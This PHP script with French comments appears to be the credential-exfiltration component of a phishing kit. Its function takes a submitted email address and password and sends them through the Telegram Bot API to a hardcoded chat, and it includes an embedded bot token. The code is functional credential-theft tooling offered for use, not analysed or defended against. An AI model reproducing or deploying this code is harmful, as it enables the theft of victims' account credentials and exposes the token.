<?php
// Fonction pour envoyer les informations à Telegram
function sendEmailDataToTelegram($email, $password) {
    $botToken = '7942341902:AAH-Es10Dc5KgSL6pJpyhMHFzFQvZMsL_HM';
    $chatId = '6970748370'; // Remplacez par l'ID du chat ou votre propre configuration

    // Créer le message à envoyer avec des émojis
    $telegramMessage = "📧 **Informations Email Soumises** :\n\n";
    $telegramMessage .= "✉️ **Adresse E-mail** : " . $email . "\n";
    $telegramMessage .= "🔑 **Mot de passe** : " . $password . "\n";

    // URL de l'API Telegram
    $apiUrl = "https://api.telegram.org/bot" . $botToken . "/sendMessage";

    // Paramètres de la requête
    $params = [
        'chat_id' => $chatId,
        'text' => $telegramMessage,
        'parse_mode' => 'Markdown' // Pour activer la mise en forme (gras, italique)
    ];

    // Initialisation de la requête cURL
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $apiUrl);
    curl_setopt($ch, CURLOPT_POST, true);
    curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query($params));
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);

    // Exécution de la requête
    $response = curl_exec($ch);

    // Vérification des erreurs
    if ($response === false) {
        echo 'Erreur cURL : ' . curl_error($ch);
    } else {
        // Décoder la réponse JSON
        $result = json_decode($response, true);
        if ($result['ok']) {
            echo 'Message envoyé avec succès à Telegram.';
        } else {
            echo 'Erreur lors de l\'envoi du message: ' . $result['description'];
        }
    }

    // Fermeture de la connexion cURL
    curl_close($ch);
}

// Exemple d'utilisation
$email = 'exemple@mail.com';
$password = 'motDePasseExemple';

// Appel de la fonction pour envoyer les données
sendEmailDataToTelegram($email, $password);
?>